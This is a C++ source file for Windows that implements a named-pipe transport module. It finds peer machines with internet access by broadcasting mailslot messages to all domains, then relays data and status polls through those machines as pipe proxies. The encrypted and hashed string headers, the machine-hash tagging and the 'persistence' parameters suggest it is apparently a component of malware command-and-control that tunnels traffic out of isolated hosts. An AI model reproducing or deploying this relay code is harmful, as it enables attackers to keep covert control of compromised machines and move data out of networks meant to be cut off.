/*
	transport_Pipes.cpp
	Use pipes to connect to some other computer in network with internet access
	Finds other computes by issuing special broadcast mailslot message
*/

#include <Windows.h>

#include "..\inc\dbg.h"

#include "..\inc\mem.h"					// ?? possibly no need to be converted to API ??
#include "..\inc\CryptoStrings.h"		// +
#include "..\inc\HashedStrings.h"		// +
#include "..\inc\MailslotWorks.h"
#include "..\inc\PipeWorks.h"

#include "NetworkConnectivity.h"
#include "transport_Generic.h"
#include "transport_Pipes.h"


// enums internal list and searches for any working pipe proxy
// returns NULL if nothing was found.
// NB: caller should dispose returned buffer itself
LPWSTR tspipesFindWorkingPipeProxyFromCachedList()
{
	LPWSTR wszPipeProxyMachine = NULL;	// name of machine selected as pipe proxy server

	// iterate all items available in current list
	while (wszPipeProxyMachine = nmlGetFreshestItem()) {

		// attempt to check if connection available for that machine
		if (pwIsRemotePipeWorkingTimeout(wszPipeProxyMachine, 10000, 1000)) { DbgPrint("found working pipe server at [%ws]", wszPipeProxyMachine); break; }

		// free buffer passed, if not found
		DbgPrint("server [%ws] is not connectable", wszPipeProxyMachine);
		my_free(wszPipeProxyMachine);

	} // while enum all

	return wszPipeProxyMachine;
}


/*
	Called when it is time to safely free all resources allocated by transport
	For ex., when transport re-init about to be performed.
	If is up to caller to make sure no query to other transport's function is being performed
*/
VOID CALLBACK tspipesDisposeTransport(PTRANSPORT_HANDLE pTransport)
{
	TSPIPES_INTERNAL_CONTEXT *pIContext = NULL;

	DbgPrint("disposing pTransport=%p", pTransport);

	// free resources at internal context
	if (pTransport->pInternalModuleContext) {

		pIContext = (TSPIPES_INTERNAL_CONTEXT *)pTransport->pInternalModuleContext;
		
		if (pIContext->wszPipeProxyServer) { my_free(pIContext->wszPipeProxyServer); }
		
		my_free(pIContext);

	} // pInternalModuleContext set

	my_free(pTransport);

	DbgPrint("done for pTransport=%p", pTransport);

}

/*
	API function to be exported
*/
BOOL CALLBACK tspipesTransportSend(PTRANSPORT_HANDLE pTransport, PTRANSPORT_QUERY pQuery)
{
	BOOL bRes = FALSE;	// default func result
	TSPIPES_INTERNAL_CONTEXT *pIContext = (TSPIPES_INTERNAL_CONTEXT *)pTransport->pInternalModuleContext;
	DWORD dwLen;	// len of buffer to be sent
	PERSISTENCE_PARAMS *pParams;	// params + data

	// _pwRemotePipeCheckSend()
	LPVOID pAnswerId = NULL;	// answer data
	DWORD dwAnswerIdLen;	// ^ it's len
	BYTE bMsgId;	// in-out param to hold message id from data envelope

	LPVOID pAnswerResult = NULL;	// answer when checking using id from pAnswerId
	DWORD dwAnswerResultLen;

	BYTE bStatusCode;	// returned from second _pwRemotePipeCheckSend() call

	// check input params
	if (!pTransport || !pQuery) { DbgPrint("ERR: invalid input params"); return bRes; }

	// server assumes PERSISTENCE_PARAMS + data to be uploaded, prepare it
	dwLen = sizeof(PERSISTENCE_PARAMS) + pQuery->lSendBufferLen;
	pParams = (PERSISTENCE_PARAMS *)my_alloc(dwLen);

	// fill params
	pParams->vciType = NON_VOLATILE;	// due to a bunch of packets may be sent here, instruct remote proxy do not remove that item when receives more queries from us
	pParams->vsSource = ncGetMachineHash();

	// addend data, if any
	if (pQuery->lSendBufferLen) {

		memcpy((LPVOID)((SIZE_T)pParams + sizeof(PERSISTENCE_PARAMS)), pQuery->pSendBuffer, pQuery->lSendBufferLen);

	} // if data present

	do {	// not a loop

		// send buffer via pipe server with answer wait. NB: answer is just handle to be used in checking, not the server answer itself
		bMsgId = PMI_SEND_QUERY;
		if (!_pwRemotePipeCheckSend(pIContext->wszPipeProxyServer, 20000, 1000, pParams, dwLen, &pAnswerId, &dwAnswerIdLen, &bMsgId)) { DbgPrint("ERR: failed to send buffer to pipe server"); break; }

		// check answer type from server
		if (bMsgId != PMI_SEND_QUERY) { DbgPrint("ERR: pipe server returned bMsgId %u, but expected %u", bMsgId, PMI_SEND_QUERY); break; }
		if (dwAnswerIdLen < sizeof(UINT64)) { DbgPrint("ERR: pipe server returned len %u, less than min expected %u", dwAnswerIdLen, sizeof(UINT64)); break; }

		DbgPrint("OK: data send query done");

		// now do periodic re-check of query status using uint64 handle from server at pAnswer
		do { // infinite loop

			bMsgId = PMI_CHECK_STATUS_QUERY;
			if (!_pwRemotePipeCheckSend(pIContext->wszPipeProxyServer, 20000, 1000, pAnswerId, dwAnswerIdLen, &pAnswerResult, &dwAnswerResultLen, &bMsgId)) { DbgPrint("ERR: failed to send buffer to pipe server (2)"); break; }

			if (dwAnswerResultLen < sizeof(BYTE)) { DbgPrint("ERR: unexpected result len (empty)"); break; }

			// check for upload finished result
			bStatusCode = *(BYTE *)pAnswerResult;
			if (bStatusCode == CS_NONE) { DbgPrint("ERR: proxy server returned CS_NONE status"); break; }

			DbgPrint("current chunk status is %u", bStatusCode);

			if (bStatusCode == CS_ANSWER_READY) {

				DbgPrint("OK: result ready, answer %u bytes", (dwAnswerResultLen - 1));

				bRes = TRUE;

				// assign result to pQuery
				if ((pQuery->pAnswer) && (dwAnswerResultLen > sizeof(BYTE))) {

					*pQuery->dwAnswerLen = dwAnswerResultLen - sizeof(BYTE);
					*pQuery->pAnswer = my_alloc(*pQuery->dwAnswerLen);
					memcpy(*pQuery->pAnswer, (LPVOID)((SIZE_T)pAnswerResult + sizeof(BYTE)), *pQuery->dwAnswerLen);
					

					// free initial answer buffer
					my_free(pAnswerResult); pAnswerResult = NULL;

				} // need to save answer

				break;

			} // CS_ANSWER_READY

			if (pAnswerResult) { my_free(pAnswerResult); pAnswerResult = NULL; }

			DbgPrint("iteration wait");
			Sleep(10000);

		} while (TRUE);	// infinite loop

	} while (FALSE); // not a loop

	// free buffers
	my_free(pParams);
	if (pAnswerId) { my_free(pAnswerId); }
	if (pAnswerResult) { my_free(pAnswerResult); }

	// modify transport's status
	if (bRes) {
		// success, reset errors count
		pTransport->dwLastFailedConnectionAttempts = 0;
	}
	else {
		// failure, inc attempt count
		pTransport->dwLastFailedConnectionAttempts++;
	} // bRes

	return bRes;
}

/*
	Tests, initializes and in case of success, returns handle to internal transport handle structure
*/
PTRANSPORT_HANDLE tspipesInitTransport()
{
	LPWSTR wszPipeProxyMachine = NULL;	// name of machine selected as pipe proxy server
	TRANSPORT_HANDLE *pTransport;	// ptr to hold allocated resulting buffer
	TSPIPES_INTERNAL_CONTEXT *pIContext;	// ptr to internal context, linked to ^

	DbgPrint("entered");



	// check if found anything
	if (!(wszPipeProxyMachine = tspipesFindWorkingPipeProxyFromCachedList())) {

		DbgPrint("nothing from cached list, about to issue MMI_NETWORK_ENABLED_SEARCH mailslot msg");

		// data is not significant here
		BYTE bSend = 1;
		if (!mwSendMailslotMessageToAllDomains(&bSend, 1, MMI_NETWORK_ENABLED_SEARCH)) { DbgPrint("ERR: failed to send message to all domains"); }

		// wait some time to gather all answers
		DbgPrint("waiting for answers");
		Sleep(10000);
		DbgPrint("done waiting for answers");

	} // nothing found at first attempt

	// second attempt
	if (!(wszPipeProxyMachine = tspipesFindWorkingPipeProxyFromCachedList())) {

		DbgPrint("ERR: no pipe servers found, transport failed to init");
		return NULL;

	}

	// if got here, we got pipe proxy name, make handle structure to be returned to caller
	pTransport = (TRANSPORT_HANDLE *)my_alloc(sizeof(TRANSPORT_HANDLE));

	// fill values
	pTransport->wLen = sizeof(TRANSPORT_HANDLE);
	pTransport->dwMaxSuggestedDataLen = 2 * 1024 * 1024;
	pTransport->ncType = NCT_PIPE_TUNNELING;

	// alloc internal context
	pIContext = (TSPIPES_INTERNAL_CONTEXT *)my_alloc(sizeof(TSPIPES_INTERNAL_CONTEXT));
	pIContext->wszPipeProxyServer = wszPipeProxyMachine;

	// assign internal context
	pTransport->pInternalModuleContext = pIContext;

	// assign general apis
	pTransport->fQuery = tspipesTransportSend;
	pTransport->fDispose = tspipesDisposeTransport;

	return pTransport;
}